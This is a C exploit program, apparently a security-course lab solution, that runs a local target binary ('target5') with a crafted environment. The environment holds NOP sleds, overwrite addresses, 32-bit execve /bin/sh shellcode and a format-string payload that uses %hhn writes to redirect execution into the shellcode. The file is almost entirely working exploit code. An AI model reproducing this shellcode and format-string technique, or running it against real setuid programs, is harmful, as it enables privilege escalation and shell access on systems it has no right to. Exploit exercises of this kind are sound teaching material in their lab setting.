#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
  char *args[3];
  char *env[17];

  args[0] = TARGET; 
  args[1] =
	"\x68\xfe\x2d\x20"; 

  args[2] = NULL;

  env[0] = "\x00";
  env[1] = "\x00";
  env[2] = "\x00";
  env[3] = 
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90"
	"\x69\xfe\x2d\x20"
	;

  env[4] = "\x00";
  env[5] = "\x00";
  env[6] = "\x00";
  env[7] = 
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90" 
	"\x6a\xfe\x2d\x20"
	;

  env[8] = "\x00";
  env[9] = "\x00";
  env[10] = "\x00";
  env[11] = 
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90" 
	"\x6b\xfe\x2d\x20";

  env[12] = "\x00";
  env[13] = "\x00";
  env[14] = "\x00";
  env[15] =

	
"\x90\x90\x90\x90\x90\x90"
//

	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh"
	//45

	"%08x%08x%08x"
	"%08x"

	//"...."
	"%17x%hhn"
	"%154u%hhn"
	"%51u%hhn"
	"%243u%hhn"

	"%08x.%08x.%08x."
	"%08x.%08x.%08x."
	"%08x.%08x.%08x."
	"%08x.%08x.%08x."
	"%08x.%08x.%08x."
	"%08x.%08x.%08x."
	"%08x.%08x.%08x."
	"%08x.%08x.%08x."
	"%08x.%08x.%08x."
	"%08x.%08x.%08x."

	;
  env[16] = NULL;


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
